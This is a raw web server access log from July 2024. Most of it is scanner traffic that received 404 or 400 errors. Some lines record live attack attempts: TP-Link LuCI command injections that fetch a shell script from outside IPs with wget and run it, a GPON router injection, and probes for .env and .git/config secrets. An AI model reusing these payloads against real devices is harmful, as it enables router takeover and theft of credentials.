77.90.7.23 - - [03/Jul/2024:17:20:29 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
185.191.126.213 - - [03/Jul/2024:17:37:16 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
57.129.23.166 - - [03/Jul/2024:17:39:42 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:17:39:42 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
87.236.176.131 - - [03/Jul/2024:17:57:47 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
77.90.7.116 - - [03/Jul/2024:18:13:35 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.116 - - [03/Jul/2024:18:13:36 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.116 - - [03/Jul/2024:18:13:36 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.116 - - [03/Jul/2024:18:13:36 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
192.155.90.118 - - [03/Jul/2024:18:38:39 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03S;5\x0E\x14\x82\xFC^\xE5=\x9DC\xEEy\xE0='3\x054Y\x22v\xE6\xE7\x10\xAC\x8C\x7F\x1F\xE1\x8E\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
157.230.37.129 - - [03/Jul/2024:18:44:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
157.230.37.129 - - [03/Jul/2024:18:45:45 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03[" 400 154 "-" "-"
57.129.23.166 - - [03/Jul/2024:19:03:35 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:19:03:35 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:19:23:45 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:19:23:46 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.197 - - [03/Jul/2024:19:46:55 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [03/Jul/2024:20:03:55 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.185.132.16 - - [03/Jul/2024:20:30:34 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.202 - - [03/Jul/2024:20:34:29 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.120 - - [03/Jul/2024:20:49:04 +0000] "GET / HTTP/1.1" 404 122 "-" "\x22Xpanse-bot"
185.224.128.43 - - [03/Jul/2024:20:49:29 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.123.170.104 - - [03/Jul/2024:20:50:13 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.72.176.129 - - [03/Jul/2024:20:50:19 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
104.197.69.115 - - [03/Jul/2024:20:55:12 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
104.197.69.115 - - [03/Jul/2024:20:55:18 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:21:45:38 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:21:45:38 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.181.223 - - [03/Jul/2024:21:55:28 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xEB\x9F,\xBF\x0B\x7FTW\xD9d\x18G\xE5\xB6\x93\xAF\xD5^\x07\xB5\x9B0c\xD0\x8F\x0B|E\x83\xA5t\x9A\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
57.129.23.166 - - [03/Jul/2024:22:06:05 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:22:06:06 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.120.210.192 - - [03/Jul/2024:22:22:51 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.120.210.192 - - [03/Jul/2024:22:23:18 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.120.210.192 - - [03/Jul/2024:22:23:44 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
170.167.193.5 - - [03/Jul/2024:22:23:53 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.120.210.192 - - [03/Jul/2024:22:24:10 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
170.167.193.5 - - [03/Jul/2024:22:25:07 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
170.167.193.5 - - [03/Jul/2024:22:25:32 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.115.210.94 - - [03/Jul/2024:22:29:56 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
20.120.210.192 - - [03/Jul/2024:22:30:16 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
170.167.193.5 - - [03/Jul/2024:22:31:14 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
94.156.68.162 - - [03/Jul/2024:22:32:13 +0000] "GET /.env HTTP/1.1" 404 122 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1"
20.120.210.192 - - [03/Jul/2024:22:36:06 +0000] "GET /generate_204 HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:38:33 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:38:38 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:38:58 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:39:00 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
141.98.83.197 - - [03/Jul/2024:22:39:10 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
76.147.138.124 - - [03/Jul/2024:22:39:18 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:39:36 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:39:41 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:40:08 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:40:12 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:40:40 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:40:42 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:41:01 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:41:04 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:41:29 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:41:31 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
76.147.138.124 - - [03/Jul/2024:22:41:55 +0000] "POST /ts2021 HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
147.185.132.147 - - [03/Jul/2024:22:49:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03WH\xC5(\xC1\xEFd'\xB0\x1E\x89\xA8J\xE8z\xE7\x81\x806g\x92(\xCD\xE8$\xBE\xF4?m\x9F\xB5\x9A \xD8|\x03@\x85\xAD\xB2\x82\xD0\x96%\x987+\xAB{K\xAA}\xAD\x1Cqgn\xAB\xDD\xDE*c\x12\xD3\x83\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
147.185.132.147 - - [03/Jul/2024:22:49:07 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xFC\x17e\xBD\x16\xA6\x8B\xA0\x22}\xF0\x06\xB8\xE7\x99\xED\x14\xEBC+\xF7\xD5l_\x8C0y\x98stM\xFE\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
83.97.73.245 - - [03/Jul/2024:23:00:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.169.39.26 - - [03/Jul/2024:23:05:37 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:23:14:27 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [03/Jul/2024:23:14:28 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:00:03:31 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:00:03:31 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.197 - - [04/Jul/2024:00:43:19 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [04/Jul/2024:00:51:33 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.97.73.245 - - [04/Jul/2024:00:58:22 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.78.249.41 - - [04/Jul/2024:01:10:53 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.32.2"
144.91.89.225 - - [04/Jul/2024:01:16:12 +0000] "GET /index.html HTTP/1.1" 404 150 "-" "-"
23.27.164.217 - - [04/Jul/2024:01:25:18 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.27.164.217 - - [04/Jul/2024:01:25:18 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.59.56 - - [04/Jul/2024:01:42:28 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
92.249.48.197 - - [04/Jul/2024:01:43:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F185.216.70.121%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.224.128.43 - - [04/Jul/2024:01:48:03 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.33 - - [04/Jul/2024:02:09:13 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.202 - - [04/Jul/2024:02:09:53 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.130.2 - - [04/Jul/2024:02:17:08 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
77.90.7.23 - - [04/Jul/2024:02:43:43 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [04/Jul/2024:02:43:44 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [04/Jul/2024:02:43:44 +0000] "GET http://example.com/ HTTP/1.1" 404 122 "-" "Go-http-client/1.1"
77.90.7.23 - - [04/Jul/2024:02:43:45 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
167.71.202.190 - - [04/Jul/2024:02:48:21 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
57.129.23.166 - - [04/Jul/2024:02:48:48 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:02:48:49 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.202.190 - - [04/Jul/2024:02:49:13 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\xF0\x86*+j\xFAm\xC7\x8EX\xC5\x90#\x8A\x8C`\x89\x9F\xBD\xD1<*U\x1E\xFF\x87\xC21N&\x0Cp \xB3\x83C\xBA\xC3\x9EY\x94\x1D\xD5Fv\xAE\x99\xDF\xF2\x0C\x05'\x0E\xC1\xE71\x83\xC2\xC6$1\xDD2\x91\xA0\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
78.153.140.177 - - [04/Jul/2024:02:54:39 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [04/Jul/2024:02:54:40 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xFCn\xD0\xB3\xC9\xAEg\xA77e$q\xB0d*\x13\xD0z\x0F\xD6\xCF\xBC^\xA0\x94\xEFT' \x1BC\x89 \x82\xAB\xE6\xDC\xDC\xBB\x94S\x19y,\xD3\xB4k{\x1A\xE0\xC8\xA3%E\xCC\xBE0\xA3G\xE42\x9Cm\xFF\xFE\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
78.153.140.179 - - [04/Jul/2024:02:59:26 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.179 - - [04/Jul/2024:02:59:27 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03\x16\xC8Y`\xBA :`\x0F\x00\xB0\x85c\xC3\xCF6e\xED\x95\xD9\xC5\xB3" 400 154 "-" "-"
141.98.83.197 - - [04/Jul/2024:03:34:57 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [04/Jul/2024:04:01:21 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
94.156.68.162 - - [04/Jul/2024:04:30:44 +0000] "GET /.git/config HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3803.0 Safari/537.36 Edg/76.0.174.0"
92.249.48.197 - - [04/Jul/2024:05:39:15 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
115.231.78.3 - - [04/Jul/2024:05:48:02 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
115.231.78.3 - - [04/Jul/2024:05:48:03 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.3 - - [04/Jul/2024:05:48:03 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.3 - - [04/Jul/2024:05:48:04 +0000] "GET /robots.txt HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
147.185.133.207 - - [04/Jul/2024:05:50:19 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
141.98.83.197 - - [04/Jul/2024:06:13:46 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
48.217.211.246 - - [04/Jul/2024:06:18:37 +0000] "GET /portal/redlion HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
31.220.1.83 - - [04/Jul/2024:06:24:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
45.79.128.205 - - [04/Jul/2024:06:25:22 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xB8\xB6m*i\x9DX\xC6u\x9B\xCB~\xF3\xE9\xC9\xE0\xEB\x80\x00;\x8DgA\x89\x22\xC0C\xC3*4Z\xD2\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
128.14.173.99 - - [04/Jul/2024:06:30:56 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
205.210.31.31 - - [04/Jul/2024:06:41:25 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
57.129.23.166 - - [04/Jul/2024:06:46:40 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:06:46:41 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.144 - - [04/Jul/2024:07:22:26 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x14K\x97\xB3\x12i,\xA5@\x07\xE49\xA5\xE0\xCA\xBF\x06`\xA2\xCD;\xF2\xC3\x96\x05\x13V\xA1w\x8C\xDF#\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
205.210.31.144 - - [04/Jul/2024:07:22:26 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x85\xEE\xE9$ps=\x98i\xD0\xF4P\x03\xAE,dp\xA6\xE4\xE1D\xC6?\x00\xC2\xD1\x8D^S\xDA\x06\xB4 \xD8\xBB\xD2\xD8G3_X\xA5G" 400 154 "-" "-"
185.224.128.43 - - [04/Jul/2024:07:25:01 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [04/Jul/2024:07:46:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
45.79.128.205 - - [04/Jul/2024:07:48:20 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03I#Fl\xC3J\xEA.1h\x1C\xC4(\xB2w3\x9BR\x093m6j\xF2\xC2\xECvx\xC7w#%\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
57.129.23.166 - - [04/Jul/2024:07:49:19 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:07:49:19 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.156.130.15 - - [04/Jul/2024:07:53:10 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
92.249.48.202 - - [04/Jul/2024:07:54:34 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
115.63.46.76 - - [04/Jul/2024:07:55:41 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 122 "-" "Hello, World"
115.63.46.76 - - [04/Jul/2024:07:55:41 +0000] "h+/tmp/gpon80&ipv=0" 400 154 "-" "-"
141.98.83.197 - - [04/Jul/2024:08:45:37 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.154 - - [04/Jul/2024:08:45:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03T\xD66\x1Em\xF0\xBE\xCE2^\xEBA\xE9\xDA\xE4\x17\x0FY\xEC[\x1A\x0C\xBB\x90=\x1F\x9B\x7F\xB8,[}\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.22.32.22 - - [04/Jul/2024:09:07:58 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.220.1.83 - - [04/Jul/2024:09:21:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
57.129.23.166 - - [04/Jul/2024:09:25:18 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:09:25:19 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.228.154.177 - - [04/Jul/2024:09:36:31 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
